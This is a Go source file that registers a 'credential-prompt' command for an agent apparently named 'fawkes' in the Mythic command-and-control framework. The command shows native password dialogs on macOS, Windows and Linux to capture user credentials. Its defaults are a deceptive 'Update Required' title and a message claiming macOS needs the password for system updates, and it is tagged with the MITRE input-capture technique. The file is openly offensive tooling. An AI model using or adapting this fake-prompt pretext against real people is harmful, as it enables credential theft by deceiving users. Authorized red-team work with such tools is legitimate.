package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "credential-prompt",
		Description:         "Display a native credential dialog to capture user credentials. macOS: AppleScript dialog. Windows: CredUI prompt. Linux: zenity/kdialog/yad.",
		HelpString:          "credential-prompt [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution]",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "title",
				ModalDisplayName: "Dialog Title",
				CLIName:          "title",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Title bar text for the dialog. Default: Update Required",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "message",
				ModalDisplayName: "Dialog Message",
				CLIName:          "message",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Body text displayed in the dialog. Default: macOS needs your password to apply system updates.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "icon",
				ModalDisplayName: "Icon",
				CLIName:          "icon",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"caution", "note", "stop"},
				Description:      "Dialog icon: caution (warning triangle), note (info), or stop (critical)",
				DefaultValue:     "caution",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			title, _ := taskData.Args.GetStringArg("title")
			if title == "" {
				title = "Update Required"
			}
			display := fmt.Sprintf("title: %s", title)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
			return response
		},
	})
}
